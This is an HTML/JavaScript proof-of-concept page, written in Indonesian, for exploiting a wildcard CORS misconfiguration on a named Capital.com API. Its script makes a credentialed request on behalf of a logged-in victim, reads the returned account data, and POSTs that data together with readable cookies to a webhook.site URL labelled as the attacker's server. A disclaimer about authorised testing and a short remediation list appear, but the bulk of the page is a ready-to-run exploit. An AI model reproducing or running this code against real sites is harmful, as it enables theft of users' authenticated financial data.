<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>CORS Exploit - Proof of Concept</title>
    <style>
        /* ==========================================
               RESET & BASE
            ========================================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0b0b1a;
            color: #e0e0e0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: #18182e;
            border-radius: 16px;
            padding: 35px 30px 30px;
            max-width: 820px;
            width: 100%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.7);
            border: 1px solid #2a2a4a;
            transition: all 0.3s ease;
        }

        /* ==========================================
               HEADER
            ========================================== */
        .header {
            text-align: center;
            margin-bottom: 25px;
        }

        .header h1 {
            font-size: 26px;
            font-weight: 700;
            color: #ff4d6d;
            letter-spacing: 0.5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            flex-wrap: wrap;
        }

        .header h1 span {
            background: #ff4d6d22;
            padding: 4px 14px;
            border-radius: 40px;
            font-size: 14px;
            font-weight: 500;
            color: #ff4d6d;
            border: 1px solid #ff4d6d44;
        }

        .subtitle {
            color: #9999bb;
            font-size: 14px;
            margin-top: 6px;
        }

        /* ==========================================
               INPUT GROUP
            ========================================== */
        .input-group {
            margin-bottom: 16px;
        }

        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #aaaacc;
            margin-bottom: 5px;
            letter-spacing: 0.3px;
        }

        .input-group input {
            width: 100%;
            padding: 11px 15px;
            border-radius: 10px;
            border: 1px solid #2e2e4e;
            background: #0f0f23;
            color: #f0f0ff;
            font-size: 14px;
            font-family: 'Courier New', monospace;
            transition: border 0.2s;
            outline: none;
        }

        .input-group input:focus {
            border-color: #ff4d6d;
        }

        /* ==========================================
               BUTTON
            ========================================== */
        .btn-exploit {
            background: #ff4d6d;
            color: #fff;
            border: none;
            padding: 14px 0;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            margin: 10px 0 18px;
            transition: background 0.25s, transform 0.1s;
            letter-spacing: 0.5px;
        }

        .btn-exploit:hover {
            background: #e63e5e;
        }

        .btn-exploit:active {
            transform: scale(0.97);
        }

        .btn-exploit:disabled {
            background: #4a4a6a;
            cursor: not-allowed;
            opacity: 0.6;
        }

        /* ==========================================
               STATUS BAR
            ========================================== */
        .status-bar {
            text-align: center;
            font-size: 14px;
            color: #8888aa;
            margin: 6px 0 14px;
            min-height: 24px;
            font-weight: 500;
        }

        .status-bar .highlight {
            color: #ffcc00;
        }

        /* ==========================================
               LOG BOX (TERMINAL STYLE)
            ========================================== */
        .log-box {
            background: #0a0a18;
            border: 1px solid #26264a;
            border-radius: 12px;
            padding: 16px 18px;
            max-height: 400px;
            overflow-y: auto;
            font-family: 'Courier New', Consolas, monospace;
            font-size: 13px;
            line-height: 1.7;
            white-space: pre-wrap;
            word-break: break-all;
            color: #b8c8ff;
            margin-top: 4px;
        }

        .log-box .green {
            color: #5cf0a0;
        }
        .log-box .red {
            color: #ff6670;
        }
        .log-box .yellow {
            color: #ffd866;
        }
        .log-box .blue {
            color: #79b8ff;
        }
        .log-box .gray {
            color: #7788aa;
        }
        .log-box .bold {
            font-weight: 700;
        }

        /* ==========================================
               SCROLLBAR STYLING
            ========================================== */
        .log-box::-webkit-scrollbar {
            width: 6px;
        }
        .log-box::-webkit-scrollbar-track {
            background: #0f0f22;
        }
        .log-box::-webkit-scrollbar-thumb {
            background: #3a3a6a;
            border-radius: 8px;
        }

        /* ==========================================
               FOOTER
            ========================================== */
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #555577;
            text-align: center;
            border-top: 1px solid #222244;
            padding-top: 16px;
            letter-spacing: 0.2px;
        }

        .footer strong {
            color: #ff4d6d;
        }

        /* ==========================================
               RESPONSIVE
            ========================================== */
        @media (max-width: 500px) {
            .container {
                padding: 20px 16px;
            }
            .header h1 {
                font-size: 20px;
            }
            .log-box {
                font-size: 12px;
                padding: 12px 14px;
                max-height: 300px;
            }
        }
    </style>
</head>
<body>

    <div class="container">

        <!-- ========== HEADER ========== -->
        <div class="header">
            <h1>
                ⚡ CORS Exploit PoC
                <span>Wildcard (*)</span>
            </h1>
            <div class="subtitle">
                Proof of Concept — CORS Misconfiguration &amp; Data Exfiltration
            </div>
        </div>

        <!-- ========== INPUT TARGET ========== -->
        <div class="input-group">
            <label>🎯 Target API</label>
            <input type="text" id="targetUrl" value="https://api.mycapital.capital.com/" />
        </div>

        <!-- ========== INPUT WEBHOOK ========== -->
        <div class="input-group">
            <label>📤 Server Penyerang (Webhook)</label>
            <input type="text" id="exfilUrl" value="https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c" />
        </div>

        <!-- ========== BUTTON ========== -->
        <button class="btn-exploit" id="attackBtn" onclick="runExploit()">
            🚀 JALANKAN EKSPLOIT
        </button>

        <!-- ========== STATUS ========== -->
        <div class="status-bar" id="statusBar">
            ⏳ Siap — pastikan Anda <span class="highlight">login</span> ke Capital.com di tab lain
        </div>

        <!-- ========== LOG TERMINAL ========== -->
        <div class="log-box" id="logBox">
            <span class="gray">[+] Menunggu aksi...</span>
        </div>

        <!-- ========== FOOTER ========== -->
        <div class="footer">
            ⚠️ <strong>Hanya untuk pengujian keamanan yang sah</strong> · Jangan gunakan tanpa izin
        </div>

    </div>

    <!-- ========================================================== -->
    <!--                         JAVASCRIPT                          -->
    <!-- ========================================================== -->
    <script>
        // ==========================================
        //  ELEMEN
        // ==========================================
        const logBox = document.getElementById('logBox');
        const statusBar = document.getElementById('statusBar');
        const attackBtn = document.getElementById('attackBtn');
        const targetInput = document.getElementById('targetUrl');
        const exfilInput = document.getElementById('exfilUrl');

        let isRunning = false;

        // ==========================================
        //  FUNGSI LOG
        // ==========================================
        function log(message, type = 'blue') {
            const colors = {
                green: 'green',
                red: 'red',
                yellow: 'yellow',
                blue: 'blue',
                gray: 'gray'
            };
            const cls = colors[type] || 'blue';
            const entry = document.createElement('div');
            entry.className = cls;
            entry.textContent = message;
            logBox.appendChild(entry);
            logBox.scrollTop = logBox.scrollHeight;
        }

        // ==========================================
        //  FUNGSI STATUS
        // ==========================================
        function setStatus(text, loading = false) {
            statusBar.innerHTML = text;
            attackBtn.disabled = loading;
            attackBtn.textContent = loading ? '⏳ Memproses...' : '🚀 JALANKAN EKSPLOIT';
        }

        // ==========================================
        //  FUNGSI EKSPLOIT UTAMA
        // ==========================================
        async function runExploit() {
            if (isRunning) return;
            isRunning = true;

            // Reset log
            logBox.innerHTML = '';
            log('[+] Memulai exploit...', 'blue');

            const targetUrl = targetInput.value.trim();
            const exfilUrl = exfilInput.value.trim();

            if (!targetUrl || !exfilUrl) {
                log('❌ Target dan Webhook URL harus diisi!', 'red');
                isRunning = false;
                return;
            }

            setStatus('⏳ Mengirim request dengan credentials...', true);

            try {
                // ==========================================
                //  STEP 1 — REQUEST KE API TARGET
                // ==========================================
                log(`📡 Target: ${targetUrl}`, 'blue');
                log(`🔑 Mode: credentials: 'include' (mengirim cookie)`, 'blue');

                const response = await fetch(targetUrl, {
                    method: 'GET',
                    credentials: 'include', // 🔑 Kirim cookie!
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    }
                });

                const status = response.status;
                const statusText = response.statusText;

                log(`📊 Status: ${status} ${statusText}`, status === 200 ? 'green' : 'yellow');

                // ==========================================
                //  STEP 2 — BACA DATA DARI RESPONSE
                // ==========================================
                let rawData = '';
                const contentType = response.headers.get('content-type') || '';

                if (contentType.includes('application/json')) {
                    const jsonData = await response.json();
                    rawData = JSON.stringify(jsonData, null, 2);
                } else {
                    rawData = await response.text();
                }

                // Tampilkan data (potong jika terlalu panjang)
                log(`📦 Data yang diterima:`, 'blue');
                const displayData = rawData.length > 600 ? rawData.substring(0, 600) + '...\n[truncated]' : rawData;
                log(displayData, 'green');

                // ==========================================
                //  STEP 3 — EKSFILTRASI KE WEBHOOK
                // ==========================================
                const payload = {
                    timestamp: new Date().toISOString(),
                    target: targetUrl,
                    status: status,
                    statusText: statusText,
                    data: rawData,
                    userAgent: navigator.userAgent,
                    origin: window.location.origin,
                    cookie: document.cookie || '(HttpOnly - tidak bisa dibaca JS)'
                };

                log(`📤 Mengirim data ke server penyerang: ${exfilUrl}`, 'blue');

                await fetch(exfilUrl, {
                    method: 'POST',
                    mode: 'no-cors', // 🔓 Supaya tidak diblokir CORS
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });

                log('✅ DATA BERHASIL DIKIRIM KE SERVER PENYERANG!', 'green');
                log(`📤 Server: ${exfilUrl}`, 'green');

                // ==========================================
                //  STEP 4 — KESIMPULAN
                // ==========================================
                log('', 'gray');
                if (status === 200) {
                    log('✅✅✅ EKSPLOIT SUKSES! Data sensitif berhasil dicuri!', 'green');
                    log('🔴 Ini adalah BUKTI KERENTANAN CORS yang valid.', 'red');
                } else if (status === 403) {
                    log('⚠️ Status 403: Belum login ke Capital.com', 'yellow');
                    log('✅ TAPI CORS tetap longgar!', 'green');
                    log('🔴 Jika user SUDAH LOGIN, data BISA dicuri!', 'red');
                    log('🔴 Ini tetap BUKTI KERENTANAN yang valid.', 'red');
                } else {
                    log(`ℹ️ Status ${status} — perlu analisis lebih lanjut.`, 'yellow');
                }

                log('', 'gray');
                log('📋 REKOMENDASI UNTUK KLIEN:', 'yellow');
                log('  1. Hapus Access-Control-Allow-Origin: *', 'yellow');
                log('  2. Gunakan whitelist domain yang valid', 'yellow');
                log('  3. Jangan gunakan credentials: true dengan origin *', 'yellow');

                setStatus('✅ Selesai — CORS Vulnerable!', false);

            } catch (error) {
                log(`❌ Error: ${error.message}`, 'red');

                if (error.message.includes('Failed to fetch')) {
                    log('', 'gray');
                    log('🔍 Kemungkinan CORS AMAN — request diblokir browser', 'yellow');
                    log('💡 Atau URL target tidak valid / tidak bisa diakses', 'yellow');
                }

                setStatus('❌ Gagal — periksa target dan koneksi', false);
            }

            isRunning = false;
        }

        // ==========================================
        //  AUTO-RUN — INSTRUKSI AWAL
        // ==========================================
        window.onload = function() {
            log('[+] Halaman PoC siap', 'blue');
            log('📌 Pastikan Anda sudah <span class="yellow">login</span> ke Capital.com di tab lain', 'yellow');
            log('💡 Klik tombol untuk menjalankan exploit', 'blue');
        };
    </script>

</body>
</html>
